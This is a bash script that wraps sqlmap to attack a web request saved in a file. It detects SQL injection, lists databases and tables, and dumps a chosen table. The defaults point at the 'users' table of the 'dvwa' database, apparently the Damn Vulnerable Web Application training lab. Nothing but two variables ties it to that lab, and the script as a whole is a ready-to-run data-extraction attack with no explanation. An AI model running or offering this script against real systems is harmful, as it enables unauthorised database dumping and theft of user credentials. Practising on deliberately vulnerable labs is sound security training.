#!/bin/bash

REQ_FILE=""
DB_NAME="dvwa"
TABLE_NAME="users"

command -v sqlmap &> /dev/null || { echo "[-] sqlmap not found"; exit 1; }
[ -f "$REQ_FILE" ] || { echo "[-] File not found: $REQ_FILE"; exit 1; }

echo "[+] Request: $REQ_FILE"
echo "[+] Database: $DB_NAME"
echo "[+] Table: $TABLE_NAME"

echo "[1/4] Detecting..."
sqlmap -r "$REQ_FILE" --batch --flush-session

echo "[2/4] Enumerating databases..."
sqlmap -r "$REQ_FILE" --dbs --batch

echo "[3/4] Enumerating tables..."
sqlmap -r "$REQ_FILE" -D "$DB_NAME" --tables --batch

echo "[4/4] Dumping data..."
sqlmap -r "$REQ_FILE" -D "$DB_NAME" -T "$TABLE_NAME" --dump --batch

echo "[+] Done"
